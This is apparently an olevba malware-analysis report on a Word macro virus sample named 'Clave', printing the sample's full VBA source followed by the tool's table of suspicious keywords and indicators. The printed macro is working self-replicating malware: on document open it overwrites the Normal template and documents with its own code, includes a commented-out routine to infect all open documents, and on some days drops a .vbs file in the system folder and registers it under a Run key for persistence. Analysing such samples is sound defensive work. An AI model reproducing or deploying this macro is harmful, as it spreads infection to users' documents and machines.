olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Clave-9731fd8e419a2fe1f80e5f117004e9c5e96bda49
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO QueTeCagas.cls 
in file: Virus.MSWord.Clave-9731fd8e419a2fe1f80e5f117004e9c5e96bda49 - OLE stream: 'Macros/VBA/QueTeCagas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
 
 On Error Resume Next
 
 Const CLAVE_RUN = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
 'Const CLAVE_EXE = "HKEY_CLASSES_ROOT\exefile\Shell\Open\Command\"
 
 'Application.ShowVisualBasicEditor = False
 
 Set docACT = ActiveDocument.VBProject.VBComponents.Item(1)
 Set Templ = NormalTemplate.VBProject.VBComponents.Item(1)
 
 If Templ.Name <> "QueTeCagas" Then
     
     tem = Templ.codemodule.CountOfLines
     
     If tem > 0 Then Templ.codemodule.deletelines 1, tem
     
     For i = 1 To docACT.codemodule.CountOfLines
        codigo = codigo & docACT.codemodule.Lines(i, 1) & vbCr
     Next i
     
     Templ.codemodule.InsertLines 1, codigo
     Templ.codemodule.ReplaceLine 1, "Sub Document_Close()"
     Templ.Name = "QueTeCagas"
         
 End If
 

 If docACT.Name <> "QueTeCagas" Then
     
     tem = docACT.codemodule.CountOfLines
     
     If tem > 0 Then docACT.codemodule.deletelines 1, tem
     
     For i = 1 To Templ.codemodule.CountOfLines
        codigo = codigo & Templ.codemodule.Lines(i, 1) & vbCr
     Next i
     
     docACT.codemodule.InsertLines 1, codigo
     docACT.codemodule.ReplaceLine 1, "Sub Document_Open()"
     docACT.Name = "QueTeCagas"
                   
 End If
 
'PARA INFECTAR TODOS LOS DOCUMENTOS ABIERTOS, ESTEN O NO ACTIVOS:

' For doc = 1 To Documents.Count
'
'   Set docs = Documents(doc).VBProject.VBComponents.Item(1)
'
'   If docs.Name <> "QueTeCagas" Then
'
'    tem = docs.codemodule.CountOfLines
'
'     If tem > 0 Then docs.codemodule.deletelines 1, tem
'
'     For i = 1 To docs.codemodule.CountOfLines
'        codigo = codigo & Templ.codemodule.Lines(i, 1) & vbCr
'     Next i
'
'     docs.codemodule.InsertLines 1, codigo
'     docs.codemodule.ReplaceLine 1, "Sub Document_Open()"
'     docs.Name = "QueTeCagas"
'
'   End If
'
' Next doc
 
 If 28 Mod Day(Now()) = 0 Then
  
  Set FileObj = CreateObject("Scripting.FileSystemObject")
  Set SystemDir = FileObj.GetSpecialFolder(1)
  
  Ruta = SystemDir & "\quetecagas.vbs"
  cod_ini = "On Error Resume Next" & vbCr & "MsgBox ""Que te cagas ;)"""
  
  If Dir(Ruta) = "" Then
      libreee = FreeFile
      Open Ruta For Append Access Write As #libreee
      Print #libreee, cod_ini
      Close libreee
  End If
  
  If System.PrivateProfileString("", CLAVE_RUN, "TeCagas") = "" Then
      System.PrivateProfileString("", CLAVE_RUN, "TeCagas") = Ruta
  End If
  
  'System.PrivateProfileString("", CLAVE_EXE, "") = Ruta
  
  MsgBox "Que te cagas ;)"
  
 End If
 
 ActiveDocument.Save
 
End Sub














+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |quetecagas.vbs      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

